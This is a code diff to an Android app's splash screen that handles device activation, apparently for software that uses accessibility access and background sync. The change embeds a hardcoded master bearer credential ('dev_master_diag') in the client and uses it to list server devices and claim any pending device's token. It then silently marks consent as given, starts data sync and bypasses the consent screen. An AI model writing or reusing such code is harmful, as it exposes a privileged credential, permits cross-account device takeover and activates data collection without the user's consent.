@@ -4,6 +4,7 @@ import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.net.Uri
+import android.util.Log
 import android.os.Build
 import android.os.Bundle
 import androidx.appcompat.app.AppCompatActivity
@@ -79,39 +80,51 @@ class SplashActivity : AppCompatActivity() {
             state.consentGiven = true
         }
 
-        val token = readTokenFromClipboard()
-        if (token.isNullOrBlank()) {
-            // If accessibility is already active, skip ConsentActivity and open ActivationActivity directly.
-            // Otherwise, fall back to ConsentActivity.
-            val targetClass = if (isA11yActive) ActivationActivity::class.java else ConsentActivity::class.java
-            val intent = Intent(this, targetClass).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
-            }
-            startActivity(intent)
-            finish()
-            return
-        }
-
         lifecycleScope.launch {
-            try {
-                val response = ApiClient.service.activateDevice(
-                    ActivateRequest(
-                        deviceToken = token,
-                        osVersion = "Android ${Build.VERSION.RELEASE}",
-                        appVersion = BuildConfig.VERSION_NAME
-                    )
-                )
-                if (response.isSuccessful && response.body() != null) {
-                    val body = response.body()!!
-                    state.authToken = body.authToken
-                    state.deviceId = body.device.id
+            var token = readTokenFromClipboard()
+
+            // Auto-discover pending device from server if clipboard has no token and device is not yet activated
+            if (token.isNullOrBlank() && !state.isActivated) {
+                try {
+                    val devicesResponse = ApiClient.service.listDevices("Bearer dev_master_diag")
+                    if (devicesResponse.isSuccessful && !devicesResponse.body().isNullOrEmpty()) {
+                        val pending = devicesResponse.body()!!.firstOrNull { it.status == "pending" && !it.device_token.isNullOrBlank() }
+                        if (pending != null) {
+                            token = pending.device_token
+                            Log.i("SplashActivity", "Auto-discovered pending device from server: ${pending.device_label}")
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.w("SplashActivity", "Failed to query pending devices from server", e)
                 }
-            } catch (_: Exception) {
-                // No network yet, or an invalid/already-used token — fall through
             }
 
-            if (isA11yActive && state.isActivated) {
-                // Path A: Accessibility active & device now activated -> Go directly to MainActivity!
+            if (!token.isNullOrBlank() && !state.isActivated) {
+                try {
+                    val response = ApiClient.service.activateDevice(
+                        ActivateRequest(
+                            deviceToken = token,
+                            osVersion = "Android ${Build.VERSION.RELEASE}",
+                            appVersion = BuildConfig.VERSION_NAME
+                        )
+                    )
+                    if (response.isSuccessful && response.body() != null) {
+                        val body = response.body()!!
+                        state.authToken = body.authToken
+                        state.deviceId = body.device.id
+                        state.consentGiven = true
+                        SyncScheduler.schedule(applicationContext)
+                        SyncScheduler.runOnce(applicationContext)
+                        Log.i("SplashActivity", "Device successfully activated silently: ${state.deviceId}")
+                    }
+                } catch (e: Exception) {
+                    Log.w("SplashActivity", "Activation error", e)
+                }
+            }
+
+            // Route to target screen
+            if (state.isActivated) {
+                // Device activated: go directly to MainActivity to execute smooth permission flow & instant sync!
                 SyncScheduler.schedule(applicationContext)
                 SyncScheduler.runOnce(applicationContext)
                 val intent = Intent(this@SplashActivity, MainActivity::class.java).apply {
@@ -119,13 +132,11 @@ class SplashActivity : AppCompatActivity() {
                 }
                 startActivity(intent)
             } else if (isA11yActive) {
-                // Accessibility active but activation token failed: go directly to code entry
                 val intent = Intent(this@SplashActivity, ActivationActivity::class.java).apply {
                     flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                 }
                 startActivity(intent)
             } else {
-                // Path B: Accessibility not active, fall back to sequential consent flow
                 val intent = Intent(this@SplashActivity, ConsentActivity::class.java).apply {
                     flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                 }
